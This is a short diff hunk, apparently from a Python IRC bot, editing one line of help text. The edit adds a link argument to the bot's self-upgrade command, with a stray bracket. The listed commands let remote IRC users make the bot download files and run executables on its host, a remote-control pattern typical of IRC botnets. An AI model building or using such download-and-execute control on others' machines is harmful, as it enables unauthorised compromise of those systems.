@@ -522,7 +522,7 @@ def main():
                                   '.raw [command]' (sends a raw command to the server),
                                   '.dl [url] [file] (downloads [url] and saves as [file]),
                                   '.run [executable file]' (execute a file),
-                                  '.upgrade' (upgrades the bot.py file),
+                                  '.upgrade [link] file]' (upgrades the bot.py file),
                                   'Hi [botnick]' (responds to any user saying hello to it),
                                   'bye [botnick]' (tells bot to quit)
                                   """
